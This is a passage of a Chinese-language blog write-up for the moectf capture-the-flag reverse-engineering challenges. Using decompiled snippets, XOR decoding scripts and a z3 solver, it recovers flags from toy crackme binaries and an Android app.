<!DOCTYPE HTML>
<html>
<head>
  <meta charset="utf-8">
  <meta http-equiv="pragma" content="no-cache">
  <meta http-equiv="cache-control" content="no-cache">
  <meta http-equiv="expires" content="0">
  
  <title>moectf_wp | nyyyddddn</title>
  <meta name="author" content="nyyyddddn">
  
  <meta name="description" content="REReverse入门指北if ( *(_DWORD *)v7 &amp;#x3D;&amp;#x3D; 13 )
   sub_401082(aMoectfF1rstSt3, v6);

aMoectfF1rstSt3 db &amp;#39;moectf&amp;#123;F1rst_St3p_1s_D0ne&amp;#125;&amp;#39;,0Ah,0



base_64pycdc 下载 编译
发现是base64变种
http://web.chacuo.net/netbasex
把索引表复制进去解密拿到flag
UPX!"> 
  
  
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">

  <meta property="og:title" content="moectf_wp"/>
  <meta property="og:site_name" content="nyyyddddn"/>

  
    <meta property="og:image" content=""/>
  

  
    <link rel="alternative" href="/atom.xml" title="nyyyddddn" type="application/atom+xml">
  
  
    <link href="/favicon.png" rel="icon">
  
  
  <link rel="stylesheet" href="/css/bootstrap.min.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/font-awesome.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/responsive.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/highlight.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/prism.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/google-fonts.css" media="screen" type="text/css">
  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->

  <script src="/js/jquery-2.0.3.min.js"></script>

  <!-- analytics -->
  




<meta name="generator" content="Hexo 6.3.0"></head>

 <body>  
  <nav id="main-nav" class="navbar navbar-inverse navbar-fixed-top" role="navigation">
    <div class="container">
      <button type="button" class="navbar-header navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
		<span class="sr-only">Toggle navigation</span>
        <span class="icon-bar"></span>
        <span class="icon-bar"></span>
        <span class="icon-bar"></span>
      </button>
	  <a class="navbar-brand" href="/">nyyyddddn</a>
      <div class="collapse navbar-collapse nav-menu">
		<ul class="nav navbar-nav">
		  
		  <li>
			<a href="/archives" title="All the articles.">
			  <i class=""></i>Archives
			</a>
		  </li>
		  
		  <li>
			<a href="/tags" title="All the tags.">
			  <i class=""></i>Tags
			</a>
		  </li>
		  
		  <li>
			<a href="/catergories" title="All the catergories.">
			  <i class=""></i>Catergories
			</a>
		  </li>
		  
		  <li>
			<a href="/about" title="About me.">
			  <i class=""></i>About
			</a>
		  </li>
		  
		  <li>
			<a href="/atom.xml" title="Subscribe me.">
			  <i class=""></i>RSS
			</a>
		  </li>
		  
		</ul>
      </div>
    </div> <!-- container -->
</nav>
<div class="clearfix"></div>

  <div class="container">
  	<div class="content">
    	 


	
		<div class="page-header">
			<h1> moectf_wp</h1>
		</div>
	



<div class="row post">
	<!-- cols -->
	
	<div id="top_meta"></div>
	<div class="col-md-9">
	

	<!-- content -->
	<div class="mypage">		
	  		

	  <h1 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h1><h2 id="Reverse入门指北"><a href="#Reverse入门指北" class="headerlink" title="Reverse入门指北"></a>Reverse入门指北</h2><pre class="line-numbers language-none"><code class="language-none">if ( *(_DWORD *)v7 &#x3D;&#x3D; 13 )
   sub_401082(aMoectfF1rstSt3, v6);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<pre class="line-numbers language-none"><code class="language-none">aMoectfF1rstSt3 db &#39;moectf&#123;F1rst_St3p_1s_D0ne&#125;&#39;,0Ah,0<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>



<h2 id="base-64"><a href="#base-64" class="headerlink" title="base_64"></a>base_64</h2><p>pycdc 下载 编译</p>
<p>发现是base64变种</p>
<p><a target="_blank" rel="noopener" href="http://web.chacuo.net/netbasex">http://web.chacuo.net/netbasex</a></p>
<p>把索引表复制进去解密拿到flag</p>
<h2 id="UPX"><a href="#UPX" class="headerlink" title="UPX!"></a>UPX!</h2><p>exeinfope中看到是upx 3.9 脱壳后</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">for</span> <span class="token punctuation">(</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token punctuation">;</span> <span class="token operator">++</span>j <span class="token punctuation">)</span>
  <span class="token punctuation">&#123;</span>
    v8 <span class="token operator">=</span> j<span class="token punctuation">;</span>
    v2 <span class="token operator">=</span> <span class="token function">sub_140073829</span><span class="token punctuation">(</span><span class="token punctuation">(</span>__int64<span class="token punctuation">)</span>inputString<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span> v8 <span class="token operator">>=</span> v2 <span class="token punctuation">)</span>
      <span class="token keyword">break</span><span class="token punctuation">;</span>
    inputString<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">^=</span> <span class="token number">0x67u</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span> flag<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">!=</span> inputString<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
      <span class="token function">sub_140073973</span><span class="token punctuation">(</span><span class="token punctuation">(</span>__int64<span class="token punctuation">)</span><span class="token string">"try again~~"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token function">sub_1400723F7</span><span class="token punctuation">(</span><span class="token number">0</span>i64<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
  <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>在这里可以得出只需要将flag全部数据异或上0x67u转ascii码就能拿到flag</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">data <span class="token operator">=</span> <span class="token punctuation">[</span>
    <span class="token number">0x0A</span><span class="token punctuation">,</span> <span class="token number">0x08</span><span class="token punctuation">,</span> <span class="token number">0x02</span><span class="token punctuation">,</span> <span class="token number">0x04</span><span class="token punctuation">,</span> <span class="token number">0x13</span><span class="token punctuation">,</span> <span class="token number">0x01</span><span class="token punctuation">,</span> <span class="token number">0x1C</span><span class="token punctuation">,</span> <span class="token number">0x57</span><span class="token punctuation">,</span> <span class="token number">0x0F</span><span class="token punctuation">,</span> <span class="token number">0x38</span><span class="token punctuation">,</span>
    <span class="token number">0x1E</span><span class="token punctuation">,</span> <span class="token number">0x57</span><span class="token punctuation">,</span> <span class="token number">0x12</span><span class="token punctuation">,</span> <span class="token number">0x38</span><span class="token punctuation">,</span> <span class="token number">0x2C</span><span class="token punctuation">,</span> <span class="token number">0x09</span><span class="token punctuation">,</span> <span class="token number">0x57</span><span class="token punctuation">,</span> <span class="token number">0x10</span><span class="token punctuation">,</span> <span class="token number">0x38</span><span class="token punctuation">,</span> <span class="token number">0x2F</span><span class="token punctuation">,</span>
    <span class="token number">0x57</span><span class="token punctuation">,</span> <span class="token number">0x10</span><span class="token punctuation">,</span> <span class="token number">0x38</span><span class="token punctuation">,</span> <span class="token number">0x13</span><span class="token punctuation">,</span> <span class="token number">0x08</span><span class="token punctuation">,</span> <span class="token number">0x38</span><span class="token punctuation">,</span> <span class="token number">0x35</span><span class="token punctuation">,</span> <span class="token number">0x02</span><span class="token punctuation">,</span> <span class="token number">0x11</span><span class="token punctuation">,</span> <span class="token number">0x54</span><span class="token punctuation">,</span>
    <span class="token number">0x15</span><span class="token punctuation">,</span> <span class="token number">0x14</span><span class="token punctuation">,</span> <span class="token number">0x02</span><span class="token punctuation">,</span> <span class="token number">0x38</span><span class="token punctuation">,</span> <span class="token number">0x32</span><span class="token punctuation">,</span> <span class="token number">0x37</span><span class="token punctuation">,</span> <span class="token number">0x3F</span>
<span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token punctuation">[</span><span class="token number">0x46</span><span class="token punctuation">,</span> <span class="token number">0x46</span><span class="token punctuation">,</span> <span class="token number">0x46</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token punctuation">[</span><span class="token number">0x1A</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token punctuation">[</span><span class="token number">0x00</span><span class="token punctuation">]</span> <span class="token operator">*</span> <span class="token number">0x17</span>

xor_result <span class="token operator">=</span> <span class="token punctuation">[</span>byte <span class="token operator">^</span> <span class="token number">0x67</span> <span class="token keyword">for</span> byte <span class="token keyword">in</span> data<span class="token punctuation">]</span>
ascii_output <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token builtin">chr</span><span class="token punctuation">(</span>byte<span class="token punctuation">)</span> <span class="token keyword">for</span> byte <span class="token keyword">in</span> xor_result<span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>ascii_output<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<h2 id="Xor"><a href="#Xor" class="headerlink" title="Xor"></a>Xor</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python">data <span class="token operator">=</span> <span class="token punctuation">[</span> <span class="token number">0x54</span><span class="token punctuation">,</span><span class="token number">0x56</span><span class="token punctuation">,</span><span class="token number">0x5C</span><span class="token punctuation">,</span><span class="token number">0x5A</span><span class="token punctuation">,</span><span class="token number">0x4D</span><span class="token punctuation">,</span><span class="token number">0x5F</span><span class="token punctuation">,</span><span class="token number">0x42</span><span class="token punctuation">,</span>
         <span class="token number">0x60</span><span class="token punctuation">,</span><span class="token number">0x56</span><span class="token punctuation">,</span><span class="token number">0x4C</span><span class="token punctuation">,</span><span class="token number">0x66</span><span class="token punctuation">,</span><span class="token number">0x52</span><span class="token punctuation">,</span><span class="token number">0x57</span><span class="token punctuation">,</span><span class="token number">0x9</span><span class="token punctuation">,</span><span class="token number">0x4E</span><span class="token punctuation">,</span><span class="token number">0x66</span><span class="token punctuation">,</span><span class="token number">0x51</span><span class="token punctuation">,</span>
         <span class="token number">0x9</span><span class="token punctuation">,</span><span class="token number">0x4E</span><span class="token punctuation">,</span><span class="token number">0x66</span><span class="token punctuation">,</span><span class="token number">0x4D</span><span class="token punctuation">,</span><span class="token number">0x9</span>
    <span class="token punctuation">,</span><span class="token number">0x66</span><span class="token punctuation">,</span><span class="token number">0x61</span><span class="token punctuation">,</span><span class="token number">0x9</span><span class="token punctuation">,</span><span class="token number">0x6B</span><span class="token punctuation">,</span><span class="token number">0x18</span><span class="token punctuation">,</span><span class="token number">0x44</span>
    <span class="token punctuation">]</span>

xor_result <span class="token operator">=</span> <span class="token punctuation">[</span>byte <span class="token operator">^</span> <span class="token number">0x39</span> <span class="token keyword">for</span> byte <span class="token keyword">in</span> data<span class="token punctuation">]</span>
ascii_output <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token builtin">chr</span><span class="token punctuation">(</span>byte<span class="token punctuation">)</span> <span class="token keyword">for</span> byte <span class="token keyword">in</span> xor_result<span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>ascii_output<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<h2 id="ANDROID"><a href="#ANDROID" class="headerlink" title="ANDROID"></a>ANDROID</h2><p>根据hint1 搜索到button的id</p>
<p>搜到r.id.check找到关键代码</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">MainActivity</span> <span class="token keyword">extends</span> <span class="token class-name">AppCompatActivity</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">char</span><span class="token punctuation">[</span><span class="token punctuation">]</span> enc <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token number">25</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">14</span><span class="token punctuation">,</span> <span class="token number">27</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">,</span> <span class="token char">'/'</span><span class="token punctuation">,</span> <span class="token number">24</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token char">'\t'</span><span class="token punctuation">,</span> <span class="token char">':'</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token char">':'</span><span class="token punctuation">,</span> <span class="token char">'*'</span><span class="token punctuation">,</span> <span class="token number">11</span><span class="token punctuation">,</span> <span class="token number">29</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">,</span> <span class="token char">'\f'</span><span class="token punctuation">,</span> <span class="token char">'\t'</span><span class="token punctuation">,</span> <span class="token char">'0'</span><span class="token punctuation">,</span> <span class="token char">'T'</span><span class="token punctuation">,</span> <span class="token number">24</span><span class="token punctuation">,</span> <span class="token char">':'</span><span class="token punctuation">,</span> <span class="token number">28</span><span class="token punctuation">,</span> <span class="token number">21</span><span class="token punctuation">,</span> <span class="token number">27</span><span class="token punctuation">,</span> <span class="token number">28</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
    <span class="token keyword">char</span><span class="token punctuation">[</span><span class="token punctuation">]</span> key <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token char">'t'</span><span class="token punctuation">,</span> <span class="token char">'h'</span><span class="token punctuation">,</span> <span class="token char">'e'</span><span class="token punctuation">,</span> <span class="token char">'m'</span><span class="token punctuation">,</span> <span class="token char">'o'</span><span class="token punctuation">,</span> <span class="token char">'e'</span><span class="token punctuation">,</span> <span class="token char">'k'</span><span class="token punctuation">,</span> <span class="token char">'e'</span><span class="token punctuation">,</span> <span class="token char">'y'</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>

    <span class="token comment">/* JADX INFO: Access modifiers changed from: protected */</span>
    <span class="token annotation punctuation">@Override</span> <span class="token comment">// androidx.fragment.app.FragmentActivity, androidx.activity.ComponentActivity, androidx.core.app.ComponentActivity, android.app.Activity</span>
    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">onCreate</span><span class="token punctuation">(</span><span class="token class-name">Bundle</span> bundle<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">super</span><span class="token punctuation">.</span><span class="token function">onCreate</span><span class="token punctuation">(</span>bundle<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">setContentView</span><span class="token punctuation">(</span><span class="token class-name">R</span><span class="token punctuation">.</span>layout<span class="token punctuation">.</span>activity_main<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">final</span> <span class="token class-name">EditText</span> editText <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">EditText</span><span class="token punctuation">)</span> <span class="token function">findViewById</span><span class="token punctuation">(</span><span class="token class-name">R</span><span class="token punctuation">.</span>id<span class="token punctuation">.</span>input<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token class-name">Button</span><span class="token punctuation">)</span> <span class="token function">findViewById</span><span class="token punctuation">(</span><span class="token class-name">R</span><span class="token punctuation">.</span>id<span class="token punctuation">.</span>check<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">setOnClickListener</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">View<span class="token punctuation">.</span>OnClickListener</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token comment">// from class: com.doctor3.basicandroid.MainActivity.1</span>
            <span class="token annotation punctuation">@Override</span> <span class="token comment">// android.view.View.OnClickListener</span>
            <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">onClick</span><span class="token punctuation">(</span><span class="token class-name">View</span> view<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                <span class="token class-name">String</span> obj <span class="token operator">=</span> editText<span class="token punctuation">.</span><span class="token function">getText</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token keyword">if</span> <span class="token punctuation">(</span>obj<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">31</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                    <span class="token class-name">Toast</span><span class="token punctuation">.</span><span class="token function">makeText</span><span class="token punctuation">(</span><span class="token class-name">MainActivity</span><span class="token punctuation">.</span><span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getApplicationContext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"长度不对哦"</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">show</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                    <span class="token keyword">return</span><span class="token punctuation">;</span>
                <span class="token punctuation">&#125;</span>
                <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> bytes <span class="token operator">=</span> obj<span class="token punctuation">.</span><span class="token function">getBytes</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">31</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>bytes<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">^</span> <span class="token class-name">MainActivity</span><span class="token punctuation">.</span><span class="token keyword">this</span><span class="token punctuation">.</span>key<span class="token punctuation">[</span>i <span class="token operator">%</span> <span class="token class-name">MainActivity</span><span class="token punctuation">.</span><span class="token keyword">this</span><span class="token punctuation">.</span>key<span class="token punctuation">.</span>length<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token class-name">MainActivity</span><span class="token punctuation">.</span><span class="token keyword">this</span><span class="token punctuation">.</span>enc<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                        <span class="token class-name">Toast</span><span class="token punctuation">.</span><span class="token function">makeText</span><span class="token punctuation">(</span><span class="token class-name">MainActivity</span><span class="token punctuation">.</span><span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getApplicationContext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"好像有哪里不对"</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">show</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                        <span class="token keyword">return</span><span class="token punctuation">;</span>
                    <span class="token punctuation">&#125;</span>
                <span class="token punctuation">&#125;</span>
                <span class="token class-name">Toast</span><span class="token punctuation">.</span><span class="token function">makeText</span><span class="token punctuation">(</span><span class="token class-name">MainActivity</span><span class="token punctuation">.</span><span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getApplicationContext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"恭喜！回答正确"</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">show</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>
        <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-none"><code class="language-none">((bytes[i] ^ MainActivity.this.key[i % MainActivity.this.key.length]) !&#x3D; MainActivity.this.enc[i])<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>这里就可以得出只要将enc ^ MainActivity.this.key[i % MainActivity.this.key.length])就可以得到bytes 上面得知bytes的长度为31</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> re
<span class="token keyword">import</span> string

enc <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">25</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">14</span><span class="token punctuation">,</span> <span class="token number">27</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">,</span> <span class="token string">'/'</span><span class="token punctuation">,</span> <span class="token number">24</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token string">'\t'</span><span class="token punctuation">,</span> <span class="token string">':'</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span>
       <span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">':'</span><span class="token punctuation">,</span> <span class="token string">'*'</span><span class="token punctuation">,</span> <span class="token number">11</span><span class="token punctuation">,</span> <span class="token number">29</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">,</span> <span class="token string">'\f'</span><span class="token punctuation">,</span> <span class="token string">'\t'</span><span class="token punctuation">,</span> <span class="token string">'0'</span><span class="token punctuation">,</span> <span class="token string">'T'</span><span class="token punctuation">,</span> <span class="token number">24</span><span class="token punctuation">,</span>
       <span class="token string">':'</span><span class="token punctuation">,</span> <span class="token number">28</span><span class="token punctuation">,</span> <span class="token number">21</span><span class="token punctuation">,</span> <span class="token number">27</span><span class="token punctuation">,</span> <span class="token number">28</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">]</span>

key <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'t'</span><span class="token punctuation">,</span> <span class="token string">'h'</span><span class="token punctuation">,</span> <span class="token string">'e'</span><span class="token punctuation">,</span> <span class="token string">'m'</span><span class="token punctuation">,</span> <span class="token string">'o'</span><span class="token punctuation">,</span> <span class="token string">'e'</span><span class="token punctuation">,</span> <span class="token string">'k'</span><span class="token punctuation">,</span> <span class="token string">'e'</span><span class="token punctuation">,</span> <span class="token string">'y'</span><span class="token punctuation">]</span>

<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">31</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> <span class="token builtin">isinstance</span><span class="token punctuation">(</span>enc<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token builtin">int</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        enc<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> enc<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">^</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>key<span class="token punctuation">[</span>i <span class="token operator">%</span> <span class="token builtin">len</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        enc<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>enc<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>key<span class="token punctuation">[</span>i <span class="token operator">%</span> <span class="token builtin">len</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span>


<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">31</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span>enc<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span> end<span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<h2 id="EQUATION"><a href="#EQUATION" class="headerlink" title="EQUATION"></a>EQUATION</h2><p>使运算全部为假就行了 把!&#x3D;改成&#x3D;&#x3D; 然后丢z3里面跑，scanf是31s，但是ida显示上是最大为24，需要修改一下长度</p>
<p>多行合并一行<a target="_blank" rel="noopener" href="https://www.lddgo.net/string/line-reduce">https://www.lddgo.net/string/line-reduce</a></p>
<p>一行按分隔符分多行<a target="_blank" rel="noopener" href="https://www.toolhelper.cn/Char/TextSplit">https://www.toolhelper.cn/Char/TextSplit</a></p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> z3 <span class="token keyword">import</span> <span class="token operator">*</span>

s <span class="token operator">=</span> Solver<span class="token punctuation">(</span><span class="token punctuation">)</span>

v4 <span class="token operator">=</span> <span class="token punctuation">[</span>Int<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'v4[</span><span class="token interpolation"><span class="token punctuation">&#123;</span>i<span class="token punctuation">&#125;</span></span><span class="token string">]'</span></span><span class="token punctuation">)</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">]</span>

<span class="token comment"># for i in range(32):</span>
<span class="token comment">#     s.add(v4[i] != 0)</span>
<span class="token comment">#     s.add(v4[i] >= 32)</span>
<span class="token comment">#     s.add(v4[i] &lt;= 126)</span>

s<span class="token punctuation">.</span>add<span class="token punctuation">(</span>v4<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">109</span><span class="token punctuation">)</span> <span class="token comment">#m</span>
s<span class="token punctuation">.</span>add<span class="token punctuation">(</span>v4<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">111</span><span class="token punctuation">)</span> <span class="token comment">#o</span>
s<span class="token punctuation">.</span>add<span class="token punctuation">(</span>v4<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">101</span><span class="token punctuation">)</span> <span class="token comment">#e</span>
s<span class="token punctuation">.</span>add<span class="token punctuation">(</span>v4<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">99</span><span class="token punctuation">)</span>  <span class="token comment">#c</span>
s<span class="token punctuation">.</span>add<span class="token punctuation">(</span>v4<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">116</span><span class="token punctuation">)</span> <span class="token comment">#t</span>
s<span class="token punctuation">.</span>add<span class="token punctuation">(</span>v4<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">102</span><span class="token punctuation">)</span> <span class="token comment">#f</span>
s<span class="token punctuation">.</span>add<span class="token punctuation">(</span>v4<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">123</span><span class="token punctuation">)</span> <span class="token comment">#&#123;</span>
<span class="token comment">#</span>

s<span class="token punctuation">.</span>add<span class="token punctuation">(</span><span class="token number">334</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">28</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">100</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">27</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">369</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">26</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">124</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">25</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">278</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">24</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">158</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">23</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">162</span> <span class="token operator">*</span> v4<span class="token punctuation">[</span><span class="token number">22</span><span class="token punctuation">]</span><span class="token operator">+</span> <span class="token number">145</span> <span class="token operator">*</span> 